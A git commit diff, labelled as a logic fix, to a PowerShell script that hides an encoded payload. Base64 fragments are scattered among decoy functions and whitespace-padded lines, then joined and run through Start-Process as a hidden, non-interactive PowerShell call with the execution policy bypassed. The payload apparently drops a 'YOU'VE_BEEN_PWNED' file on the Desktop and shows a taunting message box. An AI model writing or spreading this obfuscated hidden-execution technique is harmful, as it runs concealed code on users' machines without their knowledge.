eee1a9274b7f5ba40627b0d2614b2378db66b359
Ender <nallahabi2003@gmail.com>
2025-10-18 00:25:38 -0400

    Fixed ps1 logic errors

--- program/avdxr.ps1
+++ program/avdxr.ps1
@@ -3,26 +3,25 @@ function RandomSelection {
     $selected = Get-Random -InputObject $letters -Count 3
     $combined = ($selected -join "")
 }
-$kgjv = "HQAaQBtACAAVABvACAATQB5ACAAVAByAGEAcAAuACAASQAgAEwAZQBmAHQAIABBACAAUAByAGUAcwBlAG4AdAAgAFMAbwBtAGUAdwBoAGUAcgBlAC4AIAAuACAALgAiACkA"
-                                                                                                                                                                                                                $sdg = "stArT-PrOCeSS"; $twqn = "AZAAtAFQAeQBwAGUAIAAtAEEAcwBzAGUAbQBiAGwAe"
+$kgjv = "HQAaQBtACAAVABvACAATQB5ACAAVAByAGEAcAAuACAASQAgAEwAZQBmAHQAIABBACAAUAByAGUAcwBlAG4AdAAgAFMAbwBtAGUAdwBoAGUAcgBlAC4AIAAuACAALgAiACkA";
+RandomSelection | Out-Null; 
+                                                                                                                                                                                                                $sdg = "stArT-PrOCeSS"; $twqn = "AZAAtAFQAeQBwAGUAIAAtAEEAcwBzAGUAbQBiAGwAe";
 function ArrayShuffle {
     $arr = 1..10
     $shuffled = $arr | Sort-Object {Get-Random}
     $sum = ($shuffled | Measure-Object -Sum).Sum
 }
-$rfby = "HQAZQBtACAAYgB1AGQAIQAnACAAPgAgAH4ALwBEAGUAcwBrAHQAbwBwAC8AWQBPAFUAVgBFAF8AQgBFAEUATgBfAFAAVwBOAEUARAAuAHQAeAB0ADsACgBBAGQ";$wvub = "pOWerSHelL"
-                                                                                                                                                                                                    $hxop = "QBOAGEAbQBlACAAUAByAGUAcwBlAG4AdABhAHQAaQBvAG4ARgByAGEAbQBlAHcAbwByAGsACgBbAFMAeQBzAHQAZQBtAC4A"
+$rfby = "HQAZQBtACAAYgB1AGQAIQAnACAAPgAgAH4ALwBEAGUAcwBrAHQAbwBwAC8AWQBPAFUAVgBFAF8AQgBFAEUATgBfAFAAVwBOAEUARAAuAHQAeAB0ADsACgBBAGQ";$wvub = "pOWerSHelL";
+                                                                                                                                                                                                    $hxop = "QBOAGEAbQBlACAAUAByAGUAcwBlAG4AdABhAHQAaQBvAG4ARgByAGEAbQBlAHcAbwByAGsACgBbAFMAeQBzAHQAZQBtAC4A";
 
-$szmn = "VwBpAG4AZABvAHcAcwAuAE0AZQBzAHMAYQBnAGUAQgBvAHgAXQA6ADoAUwBoAG8AdwAoACIAUgBFAEEARAAgAE0ARQAhACAAWQBvAHUAJwB2AGUAIABGAGEAbABsAGUAbgAgAFYAaQBjA"
+$szmn = "VwBpAG4AZABvAHcAcwAuAE0AZQBzAHMAYQBnAGUAQgBvAHgAXQA6ADoAUwBoAG8AdwAoACIAUgBFAEEARAAgAE0ARQAhACAAWQBvAHUAJwB2AGUAIABGAGEAbABsAGUAbgAgAFYAaQBjA";
 
 $vgy = @("-nop","hidden","ni","byp");
 
 $kra = "ZQBjAGgAbwAgACcASQBtACAAaQBuACAAeQBvAHUAcgAgAHMAeQBzA";
 $kra += $rfby;
-RandomMath | Out-Null
 
-
-ArrayShuffle | Out-Null
+ArrayShuffle | Out-Null;
 $kra += $twqn;
 function LoopLogic {
     $x = 0
@@ -44,15 +43,14 @@ function RandomMath {
 }
 $kra += $kgjv;
 
-RandomSelection | Out-Null; $joi = "$($vgy[0]) -W $($vgy[1]) -no$($vgy[2]) -ep $($vgy[3])ass -e "
-LoopLogic | Out-Null
+RandomMath | Out-Null; $joi = "$($vgy[0]) -W $($vgy[1]) -no$($vgy[2]) -ep $($vgy[3])ass -e ";
+LoopLogic | Out-Null;
 
-
-$usbv = "$($joi) $($kra)"
+$usbv = "$($joi) $($kra)";
 $iouvh = @{
                                                                                                                                                                                                                             FilePath=$wvub
                                                                                                                                                                                                                 ArgumentList=$usbv
                                                                                                                                                                                                                                         NoNewWindow=$true
                                                                                                                                                                                                                                     Wait=$true
 }
-&$sdg @iouvh
+&$sdg @iouvh;
